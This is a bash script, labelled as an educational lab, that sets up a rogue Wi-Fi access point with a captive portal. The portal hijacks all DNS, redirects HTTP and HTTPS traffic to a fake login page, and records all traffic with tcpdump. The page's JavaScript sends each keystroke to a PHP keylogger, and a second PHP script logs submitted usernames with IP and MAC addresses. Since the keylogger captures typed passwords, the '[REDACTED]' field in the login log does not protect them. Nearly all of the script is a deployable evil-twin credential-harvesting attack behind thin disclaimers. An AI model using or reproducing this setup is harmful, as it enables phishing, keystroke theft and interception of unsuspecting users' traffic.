#!/bin/bash

# Educational Cybersecurity Lab - Captive Portal Demo
# WARNING: This is for educational purposes only in controlled environments

echo "[*] Cleaning up previous sessions..."
sudo pkill create_ap 2>/dev/null
sudo pkill dnsmasq 2>/dev/null
sudo pkill tcpdump 2>/dev/null
sudo pkill hostapd 2>/dev/null
sudo iptables -t nat -F
sudo iptables -F
sudo iptables -X

# Reset interfaces
echo "[*] Resetting network interfaces..."
for iface in $(ls /sys/class/net); do
    if [[ "$iface" != "lo" ]]; then
        sudo ip link set $iface down 2>/dev/null
        sudo iw dev $iface set type managed 2>/dev/null || true
        sudo ip link set $iface up 2>/dev/null
    fi
done

# Detect AP-capable Wi-Fi interface
echo "[*] Detecting AP-capable Wi-Fi interface..."
WIFI_INTERFACE=""
for iface in $(iw dev | grep Interface | awk '{print $2}'); do
    if iw phy$(iw dev $iface info | grep wiphy | awk '{print $2}') info | grep -A 20 "Supported interface modes" | grep -q "* AP"; then
        WIFI_INTERFACE="$iface"
        echo "[+] Found AP-capable interface: $WIFI_INTERFACE"
        break
    fi
done

if [ -z "$WIFI_INTERFACE" ]; then
    echo "[!] No suitable Wi-Fi interface found."
    echo "[!] Make sure you have a Wi-Fi adapter that supports AP mode."
    exit 1
fi

# Configuration
FAKE_SSID="EduLab_WiFi"
PORTAL_DIR="/var/www/html"
CRED_LOG="$PORTAL_DIR/access_log.txt"
KEYLOG="$PORTAL_DIR/keystrokes.txt"
DNSMASQ_LOG="/var/log/dnsmasq_lab.log"
PCAP_LOG="/tmp/lab_traffic.pcap"
AP_IP="192.168.10.1"

# Install required packages
echo "[*] Installing required packages..."
sudo apt update
sudo apt install -y apache2 dnsmasq tcpdump hostapd create_ap php

# Start AP using hostapd if create_ap fails
echo "[*] Starting fake AP..."
if command -v create_ap &> /dev/null; then
    sudo create_ap --no-virt -n $WIFI_INTERFACE $FAKE_SSID > /tmp/create_ap.log 2>&1 &
    sleep 10
    
    # Check if create_ap worked
    if ! ps aux | grep -q "[c]reate_ap"; then
        echo "[!] create_ap failed, trying alternative method..."
        # Alternative hostapd configuration would go here
    fi
else
    echo "[!] create_ap not found, please install it first"
    exit 1
fi

# Get AP IP
FAKE_IP=$(ip addr show "$WIFI_INTERFACE" | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
if [ -z "$FAKE_IP" ]; then
    FAKE_IP="$AP_IP"
    echo "[!] Could not detect AP IP, using default: $FAKE_IP"
else
    echo "[+] Detected AP IP: $FAKE_IP"
fi

# Prepare web directory
echo "[*] Setting up web interface..."
sudo rm -rf $PORTAL_DIR/*
sudo mkdir -p $PORTAL_DIR

# Create main captive portal page with checkbox requirement
cat <<'EOF' | sudo tee $PORTAL_DIR/index.html > /dev/null
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Educational Lab Network</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            background: #f0f8ff; 
            margin: 0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        h1 { 
            color: #d9534f; 
            text-align: center;
            margin-bottom: 20px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .form-group {
            margin: 15px 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .checkbox-group {
            margin: 20px 0;
            padding: 15px;
            background: #e8f5e8;
            border-radius: 5px;
        }
        input[type="checkbox"] {
            margin-right: 10px;
        }
        button {
            background: #5cb85c;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Educational Lab Network Access</h1>
        
        <div class="warning">
            <strong>⚠️ IMPORTANT NOTICE:</strong><br>
            This is a controlled cybersecurity educational environment. 
            This demonstration shows how captive portals work and potential security risks.
            <strong>Never enter real credentials on untrusted networks.</strong>
        </div>

        <form id="accessForm" action="process.php" method="POST">
            <div class="form-group">
                <label for="username">Username (use test credentials only):</label>
                <input type="text" id="username" name="username" placeholder="test_user" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password (use test credentials only):</label>
                <input type="password" id="password" name="password" placeholder="test_pass" required>
            </div>
            
            <div class="checkbox-group">
                <label>
                    <input type="checkbox" id="agreement" name="agreement" onchange="toggleSubmit()">
                    I understand this is an educational demonstration and agree to:
                    <ul style="margin: 10px 0 0 20px;">
                        <li>Only use test/fake credentials</li>
                        <li>Not attempt to access real accounts</li>
                        <li>Use this knowledge for educational purposes only</li>
                    </ul>
                </label>
            </div>
            
            <button type="submit" id="submitBtn" disabled>Access Network</button>
        </form>
        
        <div class="footer">
            Educational Cybersecurity Lab - Authorized Use Only
        </div>
    </div>

    <script>
        // Keystroke logging for educational demonstration
        let keystrokes = [];
        
        document.addEventListener('keydown', function(e) {
            // Only log if user has agreed to terms
            if (document.getElementById('agreement').checked) {
                logKeystroke(e.key, e.target.name || e.target.id || 'unknown');
            }
        });
        
        function logKeystroke(key, field) {
            // Don't log certain keys for privacy/clarity
            if (['Shift', 'Control', 'Alt', 'Meta', 'Tab', 'CapsLock'].includes(key)) {
                return;
            }
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'keylog.php', true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send('key=' + encodeURIComponent(key) + '&field=' + encodeURIComponent(field));
        }
        
        function toggleSubmit() {
            const checkbox = document.getElementById('agreement');
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = !checkbox.checked;
        }
        
        // Prevent form submission if checkbox not checked
        document.getElementById('accessForm').addEventListener('submit', function(e) {
            if (!document.getElementById('agreement').checked) {
                e.preventDefault();
                alert('You must agree to the terms to continue.');
            }
        });
    </script>
</body>
</html>
EOF

# Create success page
cat <<'EOF' | sudo tee $PORTAL_DIR/success.html > /dev/null
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Granted</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            background: #f0f8ff; 
            text-align: center;
        }
        .success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 20px;
            border-radius: 5px;
            margin: 20px auto;
            max-width: 500px;
        }
    </style>
</head>
<body>
    <div class="success">
        <h2>✅ Access Granted</h2>
        <p>You have successfully completed the educational demonstration.</p>
        <p>In a real scenario, you would now have network access.</p>
        <p><strong>Remember:</strong> Always verify network authenticity before entering credentials!</p>
    </div>
    <p><a href="index.html">Return to Portal</a></p>
</body>
</html>
EOF

# Create captive portal detection files
sudo ln -sf index.html $PORTAL_DIR/generate_204
sudo ln -sf index.html $PORTAL_DIR/hotspot-detect.html
sudo ln -sf index.html $PORTAL_DIR/ncsi.txt
sudo ln -sf index.html $PORTAL_DIR/connecttest.txt

# Create PHP processing script
cat <<'EOF' | sudo tee $PORTAL_DIR/process.php > /dev/null
<?php
// Get client information
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Get MAC address (may require additional tools)
$mac = trim(shell_exec("arp -n $ip 2>/dev/null | grep $ip | awk '{print \$3}' | head -1"));
if (empty($mac)) {
    $mac = 'unknown';
}

// Check if agreement was checked
if (!isset($_POST['agreement'])) {
    header('Location: index.html?error=agreement_required');
    exit;
}

// Log access attempt
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$log_entry = "[$timestamp] IP: $ip | MAC: $mac | User: $username | Pass: [REDACTED] | UA: $user_agent\n";
file_put_contents('access_log.txt', $log_entry, FILE_APPEND | LOCK_EX);

// Redirect to success page
header('Location: success.html');
exit;
?>
EOF

# Create keystroke logger
cat <<'EOF' | sudo tee $PORTAL_DIR/keylog.php > /dev/null
<?php
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');
$key = $_POST['key'] ?? '';
$field = $_POST['field'] ?? '';

// Get MAC address
$mac = trim(shell_exec("arp -n $ip 2>/dev/null | grep $ip | awk '{print \$3}' | head -1"));
if (empty($mac)) {
    $mac = 'unknown';
}

if (!empty($key)) {
    $log_entry = "[$timestamp] IP: $ip | MAC: $mac | Field: $field | Key: $key\n";
    file_put_contents('keystrokes.txt', $log_entry, FILE_APPEND | LOCK_EX);
}
?>
EOF

# Set proper permissions
sudo chown -R www-data:www-data $PORTAL_DIR
sudo chmod 755 $PORTAL_DIR
sudo chmod 644 $PORTAL_DIR/*.html $PORTAL_DIR/*.php
sudo touch $CRED_LOG $KEYLOG
sudo chown www-data:www-data $CRED_LOG $KEYLOG
sudo chmod 666 $CRED_LOG $KEYLOG

echo "[*] Restarting Apache..."
sudo systemctl restart apache2
sudo systemctl enable apache2

# Configure iptables for captive portal
echo "[*] Configuring firewall rules..."
sudo iptables -P FORWARD DROP
sudo iptables -A FORWARD -i $WIFI_INTERFACE -p tcp --dport 80 -j ACCEPT
sudo iptables -A FORWARD -i $WIFI_INTERFACE -p udp --dport 53 -j ACCEPT
sudo iptables -t nat -A PREROUTING -i $WIFI_INTERFACE -p tcp --dport 80 -j DNAT --to-destination $FAKE_IP:80
sudo iptables -t nat -A PREROUTING -i $WIFI_INTERFACE -p tcp --dport 443 -j DNAT --to-destination $FAKE_IP:80
sudo iptables -t nat -A POSTROUTING -o $(ip route | grep default | awk '{print $5}' | head -1) -j MASQUERADE

# Configure DNS hijacking
echo "[*] Configuring DNS..."
sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup 2>/dev/null || true
cat <<EOF | sudo tee /etc/dnsmasq.conf > /dev/null
# Educational Lab DNS Configuration
interface=$WIFI_INTERFACE
dhcp-range=192.168.10.50,192.168.10.100,12h
address=/#/$FAKE_IP
log-queries
log-facility=$DNSMASQ_LOG
no-resolv
server=8.8.8.8
server=8.8.4.4
EOF

sudo systemctl restart dnsmasq
sudo systemctl enable dnsmasq

# Start packet capture
echo "[*] Starting packet capture..."
sudo tcpdump -i $WIFI_INTERFACE -w $PCAP_LOG -s 0 > /dev/null 2>&1 &

# Display status
echo ""
echo "=================================================="
echo "[+] Educational Captive Portal Lab is ACTIVE"
echo "=================================================="
echo "SSID: $FAKE_SSID"
echo "AP IP: $FAKE_IP"
echo "Web Interface: http://$FAKE_IP"
echo ""
echo "Log Files:"
echo "  - Access Log: $CRED_LOG"
echo "  - Keystroke Log: $KEYLOG"
echo "  - DNS Log: $DNSMASQ_LOG"
echo "  - Packet Capture: $PCAP_LOG"
echo ""
echo "To stop the lab:"
echo "  sudo pkill create_ap hostapd dnsmasq tcpdump"
echo "  sudo iptables -F && sudo iptables -t nat -F"
echo "=================================================="

# Monitor logs in real-time (optional)
read -p "Monitor logs in real-time? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo "[*] Monitoring logs (Ctrl+C to stop)..."
    tail -f $CRED_LOG $KEYLOG $DNSMASQ_LOG
fi
